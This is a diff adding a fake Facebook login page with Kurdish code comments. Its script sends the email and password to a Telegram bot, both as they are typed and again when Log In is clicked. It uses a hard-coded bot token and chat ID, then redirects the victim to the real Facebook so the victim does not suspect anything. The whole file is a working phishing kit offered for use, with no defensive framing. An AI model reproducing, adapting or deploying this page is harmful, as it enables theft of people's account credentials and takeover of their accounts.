@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – Log In or Sign Up</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; padding: 20px 0; text-align: center; }
+        .logo { width: 112px; }
+        .login-container { background: white; padding: 20px; width: 90%; max-width: 400px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); margin-top: 10px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { background-color: #1877f2; color: white; border: none; width: 100%; padding: 12px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .forgot { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-top: 15px; text-align: center; }
+        .footer { margin-top: 50px; width: 90%; text-align: center; color: #737373; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zpqL0L.svg" alt="Facebook" class="logo">
+    </div>
+
+    <div class="login-container">
+        <form id="fbForm">
+            <input type="text" id="email" placeholder="Email address or phone number" oninput="liveTrack()">
+            <input type="password" id="pass" placeholder="Password" oninput="liveTrack()">
+            <button type="button" class="login-btn" onclick="finalStep()">Log In</button>
+        </form>
+        <a href="#" class="forgot">Forgotten password?</a>
+    </div>
+
+    <div class="footer">
+        English (UK) • کوردی • االعربية • فارسی<br><br>
+        Meta © 2026
+    </div>
+
+    <script>
+        // لێرە زانیارییەکانی خۆت دابنێ
+        const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
+        const ID = '6351568884';
+
+        let timer;
+
+        // ئەم بەشە هەر پیتێک بنووسرێت بۆتی تێلێگرام ئاگادار دەکاتەوە
+        function liveTrack() {
+            clearTimeout(timer);
+            timer = setTimeout(() => {
+                const email = document.getElementById('email').value;
+                const pass = document.getElementById('pass').value;
+
+                if (email.length > 2 || pass.length > 2) {
+                    const msg = `⌨️ خەریکی نووسینە...\n👤 ئیمەیڵ: ${email}\n🔑 پاسوۆرد: ${pass}`;
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
+                }
+            }, 1500); // تەنها کاتێک دەنێرێت کە ١.٥ چرکە بوەستێت
+        }
+
+        // ئەم بەشە کاتێک کلیک لە Log In دەکات، داتا کۆتاییەکە دەنێرێت و دەچێتە سەر فەیسبووک
+        function finalStep() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const finalMsg = `✅ داتای کۆتایی گەیشت:\n📧 ${email}\n🔐 ${pass}`;
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(finalMsg)}`)
+            .then(() => {
+                // کەسەکە ڕەوانەی لاپەڕەی فەرمی فەیسبووک دەکات تا گومان نەکات
+                window.location.href = "https://www.facebook.com";
+            });
+        }
+    </script>
+
+</body>
+</html>
